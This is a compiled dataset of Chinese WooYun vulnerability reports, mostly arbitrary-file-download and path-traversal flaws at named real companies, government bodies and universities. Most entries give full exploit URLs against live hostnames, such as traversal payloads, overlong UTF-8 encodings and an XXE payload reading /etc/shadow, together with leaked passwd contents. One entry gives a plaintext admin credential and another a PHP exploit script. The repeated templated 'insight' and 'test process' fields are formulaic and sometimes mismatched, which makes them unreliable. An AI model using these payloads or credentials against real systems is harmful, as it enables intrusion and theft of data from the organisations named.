2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常下载图片：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=DSCN0292.jpg|@~@&SUB_DIR=&PIC_PATH=d:/myoa/%D4%B1%B9%A4%BB%EE%B6%AF修改路径下载文件：下载index.php：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=index.php|@~@&SUB_DIR=&PIC_PATH=d:/myoa/webroot下载cmd.exe：http://**.**.**.**/general/picture/batch_down.php?TmpFileNameStr=cmd.exe|@~@&SUB_DIR=&PIC_PATH=c:/windows/system32

**POC**: 如上。

**绕过**: 直接利用

**修复**: 无。
---

---
### [wooyun-2015-0151714] 东方航空某站点任意文件下载
**厂商**: 中国东方航空股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://cemftp.ce-air.com/yyoa/seeyonDownLoadPic?filename=../../../../../../../../../../windows/win.ini&userFileType=1http://cemftp.ce-air.com/yyoa/seeyonDownLoadPic?filename=../../../../../../../../../../windows/system.ini&userFileType=12.目录遍历http://cargotest.ce-air.com/install/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-011761] iPhone AVPlayer Ftp 目录遍历
**厂商**: EPLAYWORKS | **年份**: 2012 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: AVPlayer在ftp上功能缺陷导致目录遍历、任意文件下载。

**POC**: 1.开启客户端的共享。2.匿名ftp登陆上去。3.遍历目录。4.下载passwd。

**绕过**: 直接利用

**修复**: 做验证和过滤
---

---
### [wooyun-2011-03319] 北京大学出版社目录遍历
**厂商**: 北京大学出版社 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: coldfusion管理员界面存在目录遍历漏洞，适用于coldfusion8以下版本，可以遍历同一个分区下的文件，可能暴露系统敏感文件，coldfusion密码文件等

**POC**: http://cbs.pku.edu.cn/CFIDE/administrator/index.cfm?locale=../../../../../../../../../../../../../../../../boot.ini%00en

**绕过**: 直接利用

**修复**: 目前7及其一下版本未出补丁，建议升级服务器或者为CFIDE目录设置访问权限
---

---
### [wooyun-2015-0102461] 中国石化某站文件下载数据库连接信息泄露
**厂商**: 中国石油化工股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国石化某站文件下载数据库连接信息泄露。地址：http://218.58.78.123:8080/web.rar数据库信息：

**POC**: 数据库信息代码如下：<?xml version="1.0"?><!--2008-09-24 portal--><configuration><!--AJAX begin--><configSections><sectionGroup name="system.web.extensions" type="System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0120595] 华数数字电视传媒漏洞大礼包（可导致商城大量订单及用户信息等泄露）
**厂商**: 华数数字电视传媒集团有限公司 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://218.108.129.77:8080/华数无线运营中心使用的是Srun3000计费系统，存在任意文件下载漏洞/etc/passwd另一个服务器存在列目录漏洞http://218.108.129.133:8888/不知道这些卫视的是什么东西另一个接口设置不当，导致华数商城大量订单及用户信息泄露，订购信息，缴费信息等http://218.108.129.135:8080/demo_main.do营业厅信息产品信息

**POC**: http://218.108.129.77:8080/华数无线运营中心使用的是Srun3000计费系统，存在任意文件下载漏洞/etc/passwd另一个服务器存在列目录漏洞http://218.108.129.133:8888/不知道这些卫视的是什么东西另一个接口设置不当，导致华数商城大量订单及用户信息泄露，订购信息，缴费信息等http://218.108.129.135:8080/demo_main.do营业厅信息产品信息

**绕过**: 直接利用

**修复**: 加强权限控制
---

---
### [wooyun-2015-0119901] 都邦保险某系统存在任意文件下载漏洞
**厂商**: 都邦保险 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 都邦保险卡单自助激活系统http://icsa.dbic.com.cn/bs/bsPrdController.do?method=getPrdouKindList#右键图片属性可以得到问题urlhttp://icsa.dbic.com.cn/servlet/FileLookServlet?upfileurl=/dbicapps/accsys/card/image/1270188867403.jpg

**POC**: 构造一下http://icsa.dbic.com.cn/servlet/FileLookServlet?upfileurl=/etc/passwdhttp://icsa.dbic.com.cn/servlet/FileLookServlet?upfileurl=/etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2011-02581] 武汉市公安局网站遍历漏洞
**厂商**: 人人网 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历目录，过滤不严。

**POC**: http://www.whga.gov.cn/frontpage/.svn/entries

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0139302] 上饶市商业银行某系统目录遍历
**厂商**: 上饶市商业银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/usermain/user/userregister.jsp该页面存在遍历文件功能用../../遍历就可以了

**POC**: **.**.**.**/usermain/user/userregister.jsp该页面存在遍历文件功能用../../遍历就可以了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013724] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  17173游戏
**厂商**: 17173游戏 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://book.17173.com/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2015-0134135] 海康威视旗下萤石商城任意文件读取
**厂商**: 海康威视 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://kms.ys7.com:8081/logPage/?logType=../../../../../../../../../../usr/local/nginx/logs/error.log&executorId=2&appId=app-20140829153405-0000http://kms.ys7.com:8081/logPage/?logType=../../../../../../../../../../etc/passwd&executorId=2&appId=app-20140829153405-0000

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 访问控制
---

---
### [wooyun-2016-0188979] 神器之互动作业某服务器任意文件读取+SVN信息泄露(涉及70多万用户明文信息)
**厂商**: 北京千阳远望信息技术有限公司 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先利用神器找到Glassfishhttps://112.124.107.207:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd通过查看.bash_history找到WEB目录发现有.svn

**POC**: http://112.124.107.207/.svn/entries幸运的是3306数据库端口外联

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0135277] 财达证券主站任意文件读取
**厂商**: 财达证券有限责任公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.s10000.com/ubsiServlet?xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/shadow%22%3E]%3E%3Cubsi%20service=%22service%22%20method=%22method%22%3E%3Cobject%20type=%22Integer%22%3E%26xxe;%3C/object%3E%3C/ubsi%3E

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ：）
---

---
### [wooyun-2014-063510] 东航某站任意文件读取
**厂商**: 中国东方航空股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://eholiday.ceair.compasswd文件URL:http://eholiday.ceair.com//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwdgroupURL:http://eholiday.ceair.com//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/groupservicesURL:http:/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2013-038380] 北京现代汽车培训管理系统弱口令及下载任意文件
**厂商**: beijing-hyundai.com.cn | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在朋友圈发现了他们内部地址，试了一下，发现弱口令（估计以为是内部网没在意）http://61.50.156.38/用户名：1    密码：111111关键还是感谢会提示我这个用户存在不存在。- -！登陆后上传头像无果，注入无果。随后看看他们培训教程，发现问题。该下载链接包含路径…………。试试……

**POC**: 到此也不用深入啦，我就是为了骗点乌云币。。。。。。

**绕过**: 直接利用

**修复**: 弱口令！下载任意文件，你都懂。。。。
---

---
### [wooyun-2015-0147137] 信义房屋网站任意文件下载（臺灣地區）
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/aspnet_client/http://**.**.**.**/ckfinderhttp://**.**.**.**https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/http://**.**.**.**/dl/images/http://**.**.**.**/Log/http://**.**.**.**/Control/http://**.**.**.**/html/....

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 403 Forbbiden
---

---
### [wooyun-2013-038613] 瑞丽某处任意文件下载
**厂商**: rayli.com.cn | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 瑞丽网下载图片的地方存在了任意文件下载的漏洞

**POC**: http://adsite3.rayli.com.cn/download.php?img=../../../../../etc/passwd上些图片~

**绕过**: 直接利用

**修复**: 对下载地址验证过滤
---

---
### [wooyun-2014-048472] 某知名教育网软件任意文件下载漏洞
**厂商**: 上海释锐教育软件有限公司 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 举例：ELECTIVE.SFLS.CN:8080，释锐校校用平台。用自己的账户登录上去，什么也没有。慢着？！把stu_index.jsp去掉，进入了管理平台，传了个asp（当然这里无用，为了演示）。给了个下载链接：http://elective.sfls.cn:8080/us/download_file.jsp?path=97-100-103-96-110-42-92-95-104-100-105-40-45-43-44-47-43-44-44-43-43-44-48-52-47-45-40-49-45-47-52-51-48-45-44-49-41-92-110-107-&fileName=44-41-92-110-107-&remote=null看起来像是ASCII码表……但是转换过来不是啊，adg`d*……42是怎么回事？一定是47号/这样一来，每个+5，出现真实链接……这样，就可以

**POC**: http://elective.sfls.cn:8080/us/user/ssologin.jsp下载链接：http://elective.sfls.cn:8080/us/download_file.jsp?path=112-110-96-109-42-110-110-106-103-106-98-100-105-41-101-110-107-&fileName=110-110-106-103-106-98-100-105-41-101-110-107-意外收获：http://elective.sfls.cn:8080/us/files/tec_export.xls 管理员及教师密码拿到管理员

**绕过**: 直接利用

**修复**: 对该敏感文件限制访问权限（需登录），上传下载文件规定在一个目录里，直接访问403.
---

---
### [wooyun-2014-051743] ThinkSAAS逻辑漏洞可致拖库
**厂商**: thinksaas.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: thinksaas系统使用常量IN_TS来控制页面的访问，然后在每个功能模块用一句代码：defined('IN_TS') or die('Access Denied.');来限制访问，这样设计带来的问题是，一个文件包含可以通杀，越权访问执行任意功能模块。看到/app/user/action/plugin.php代码：<?php//插件条件入口defined('IN_TS') or die('Access Denied.');if(is_file('plugins/'.$app.'/'.$plugin.'/'.$in.'.php')){require_once('plugins/'.$app.'/'.$plugin.'/'.$in.'.php');}else{tsNotice('sorry:no plugin!');}利用上面的代码可以任意包含php文件，接着看到/app/system/ac

**POC**: <?phpdate_default_timezone_set('Asia/Hong_Kong');$url = "http://192.168.116.129/thinksaas/index.php?app=user&ac=plugin&plugin=face&in=my5t3ry/../../../../app/system/action/sql&ts=export";file_get_contents($url);$time = date('YmdHis');for($i = $time; $i <= $time + 300; $i++){$filename = $i ."_all_v1.

**绕过**: 直接利用

**修复**: 过滤&限制
---

---
### [wooyun-2015-0123341] 重庆邮电大学某站任意文件下载漏洞导致后台沦陷
**厂商**: 重庆邮电大学 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 研究生院后台地址http://gs.cqupt.edu.cn/adminv612/  使用的是JumboECMS首先访问http://gs.cqupt.edu.cn/ajax/content.aspx?cType=soft&id=22&oper=ajaxDownCount&debugkey=5E7D-8A8B-F75C-BFF爆出物理路径如图访问链接http://gs.cqupt.edu.cn/file.axd?file=D:\Web_Smylv\_data\config\conn.config即可下载数据库配置文件加密方式是sha256 然后破解之一得到用户名yanxiaoli密码flight7754登陆后台提权就算了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对待下载文件类型进行检查，判断是否允许下载类型。
---

---
### [wooyun-2011-03633] 中国移动天津公司任意文件下载漏洞
**厂商**: 中国移动 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://211.137.172.252/adc/download.do?filename=../index.jsphttp://211.137.172.252/adc/download.do?filename=../WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 你们比我在行
---

---
### [wooyun-2014-066833] 北京航空航天大学分站漏洞集合
**厂商**: 北京航空航天大学 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://alumni.sjp.buaa.edu.cn/image.asp 前人足迹http://archives.buaa.edu.cn/htmleditor/ 黑页http://archives.buaa.edu.cn/showContent.aspx?columnID=a012f24a-025c-4411-87d6-43a695413720&recID=579&tabName=column_47 注入http://artgallery.buaa.edu.cn/Rules/List.aspx?id=173 注入http://bhfx.buaa.edu.cn/index.php?menuid=38&artid=1251&option=com_content&module=24&sortid= 注入http://cgtg.buaa.edu.cn/link/.svn/entries sv

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 慢慢修
---

---
### [wooyun-2015-0164660] 国家电网某站任意文件下载（可读shadow）
**厂商**: 国家电网公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://www.caib.sgcc.com.cn/cms/web/jspdownload.jsp?FileUrl=/etc/shadow

**POC**: http://www.caib.sgcc.com.cn/cms/web/jspdownload.jsp?FileUrl=/etc/passwd

**绕过**: 直接利用

**修复**: 略
---

---
### [wooyun-2015-0127437] 金蝶EAS官网在线体验环境任意文件读取
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://easshow.kingdee.com:7896/portal/logoImgServlet?language=ch&dataCenter=&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 既然都通知相关部门修复了，也把官网上的在线体验处修修吧。
---

---
### [wooyun-2013-027477] 苏宁某应用任意文件下载漏洞可获取敏感信息
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://online.suning.com/webchat/down.jsp?file=../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mai

**POC**: snadmin:x:500:500::/home/snadmin:/bin/bashwcsuser:x:800:800::/home/wcsuser:/bin/bash

**绕过**: 直接利用

**修复**: 不要相信用户的输入
---

---
### [wooyun-2011-02519] 网易任意文件读取
**厂商**: 网易 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bafang.163.com/software/download?soft=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.jpg

**POC**: http://bafang.163.com/software/download?soft=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.jpg

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0157167] 招商基金某系统存在任意文件下载漏洞
**厂商**: 招商基金管理有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://online.cmfchina.com/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://online.cmfchina.com/live800/downlog.jsp?path=/&fileName=/etc/hostshttp://online.cmfchina.com/live800/downlog.jsp?path=/&fileName=/root/.bash_history

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0127354] 阳光保险集团某app服务端任意文件下载漏洞
**厂商**: 阳光保险集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 掌中阳光app 服务端http://app.sinosig.com/cpmap/DownApk?path=/../../../../../../../../../etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 过滤啊过滤
---

---
### [wooyun-2015-0122438] 新浪某分站任意文件读取漏洞
**厂商**: 新浪 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://218.213.85.103/cgi-bin/api/sb/hottest_news.cgi?c=../../../../../../../../../../etc/passwd%00&_=1435037199895root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/halt

**POC**: http://218.213.85.103/cgi-bin/api/sb/hottest_news.cgi?c=../../../../../../../../../../etc/hosts%00&_=1435037199895# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1	sina235 localhost.localdomain localhost::1		localhost6.localdomain6 localh

**绕过**: 直接利用

**修复**: 安全过滤
---

---
### [wooyun-2015-0135789] 中金在线某系统目录遍历漏洞
**厂商**: 福建中金在线网络股份有限公司 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://product.cnfol.com/WebSite/泄露源码：

**POC**: 泄露数据库密码：

**绕过**: 直接利用

**修复**: 修改默认配置
---

---
### [wooyun-2013-039073] 目录遍历、任意文件下载
**厂商**: 山东省旅游局官网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.sdta.cn/dtss/WEB-INF/通过遍历目录，可以查看源文件目录及代码。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 需要修改源代码，过滤提交请求。
---

---
### [wooyun-2015-0147896] 东南大学某院整站打包、数据库下载、跨磁盘任意文件下载
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**先来扫目录吧http://**.**.**.**/ad/http://**.**.**.**/admin/http://**.**.**.**/api/http://**.**.**.**/aspupload/http://**.**.**.**/database/http://**.**.**.**/editor/http://**.**.**.**/inc/http://**.**.**.**/reg/………翻目录，找到了几个数据库文件，但都无法下载。继续，，找到了有点用的http://**.**.**.**/aspupload/09_misc/DirectoryListing.asp?Dir=c:\C盘遍历而且可以跨磁盘，不过d盘和e盘拒绝，c盘和f盘可以遍历下载试下服务器是否可远程桌面，既然可以，那我们可以把C盘下的sam文件下载了，然后破

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ……
---

---
### [wooyun-2012-08203] 上海交通网(上海市交通运输和港口管理局)任意文件下载漏洞
**厂商**: 上海交通网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 因为对opencms不熟..就木有找 配置文件鸟。而且貌似把WEB-INF换地方了。这里赞一个

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023311] 华南农业大学任意文件读取导致数据库信息泄漏
**厂商**: 华南农业大学 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.scau.edu.cn/xw/201305/t20130508_116682.htm源码再次泄露漏洞文件：inc/html.php

**POC**: http://www.scau.edu.cn/xw/201305/t20130508_116682.htm源码再次泄露漏洞文件：inc/html.php

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2013-039745] 社科院某系统任意文件读取漏洞
**厂商**: 中国社会科学院 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件读取http://qk.cass.cn/ids/admin/debug/fv.jsp?f=/../../../../../../../../../etc/shadow信息泄露http://qk.cass.cn/ids/admin/debug/env.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019875] 多个政府站点深信服设备敏感文件下载(补丁不及时),成功控制设备
**厂商**: 多个政府站点 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 深信服应用交付管理系统权限绕过甘肃省教育厅https://yjpx.gsedu.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf陕西省监察厅https://qinfeng.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf张家港市人民政府https://zjg.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf上杭县人民政府https://shanghang.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf德州市人民政府https://dezhou.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf

**POC**: ...

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0161541] icloud钓鱼站点漏洞再测试
**厂商**: 金盾钓鱼管理系统 | **年份**: 2015 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昨天有个大牛哥们为了女神10分钟黑了个icloud钓鱼站，不想今天也收到了钓鱼邮件，也跟着刷了一把。不过骗子的钓鱼站真心做的不咋地。首先说站点：http://**.**.**.**/点进去UI还不错，但是页面基本上没有标签超链接可以点击，除了用户名密码那儿可以输入。发现随便输入什么密码都会提示错误，于是查看源码，发现数据会po到这个页面上。尝试注入,发现最后不管怎样都会有：对站点目录遍历，发现站点权限根本没做防护果断拿wwwroot，松松的把制作人给卖了顺便。。。我还看到有个用拼音写的文件。。。xiugai_email.asp，居然还没有加cookie。。于是smtp邮箱、密码通通都出来。。。

